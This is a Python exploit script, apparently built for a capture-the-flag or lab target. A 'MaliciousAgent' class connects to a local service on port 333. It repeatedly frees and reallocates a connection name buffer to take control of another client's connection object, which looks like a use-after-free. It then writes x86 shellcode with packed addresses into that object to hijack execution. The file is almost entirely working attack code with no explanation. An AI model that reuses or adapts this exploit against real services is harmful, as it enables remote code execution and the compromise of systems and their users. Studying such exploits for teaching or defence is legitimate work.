from my_agent import *
import struct

STRUCT_ADDR = 0x96581c
SHELLCODE = b"\x31\xc0\xbb\xea\x1b\xe6\x77\x66\xb8\x88\x13\x50\xff\xd3"

def craft_shellcode(address):
	addr = struct.pack("<I", address + 4)
	addr2 = struct.pack("<I", address + 8)
	print("Fault address should be {}".format(hex(address+8)))
	shellcode = (addr + addr2 + SHELLCODE).ljust(64, "\x00")
	return shellcode

class MaliciousAgent(object):
    def __init__(self):
        self.reconnect()

    def reconnect(self):
        self.agent = pythonAgent(("127.0.0.1", 333))
        self.agent.connect(b"a"*24)

    def free(self):
        self.agent.put_new_name(b"b"*100)

    def is_controlling_conn(self, victim):
        name = self.agent.read_name()[1]
        addr = struct.unpack("<I", name[:4])[0]

        if name != "a"*24:
            if addr == STRUCT_ADDR:
                return True
            else:
                self.reconnect()
        
        return False

    def close(self):
    	self.agent.close()


    def control_new_conn_obj(self):
        while True:
            self.free()

            victim = pythonAgent(("127.0.0.1", 333))
            victim.connect("a"*64)

            if self.is_controlling_conn(victim):
                return victim

    def exploit(self, victim):
    	name = self.agent.read_name()[1]
    	name_address = struct.unpack("<I", name[20:])[0]
    	new_name = name[20:] + name[4:]

    	victim.put_new_name(craft_shellcode(name_address))

    	self.agent.put_new_name(new_name)

    	victim.send_message_to_server("This should crash now")


if __name__ == "__main__":
	m = MaliciousAgent()
	victim = m.control_new_conn_obj()

	m.exploit(victim)

            
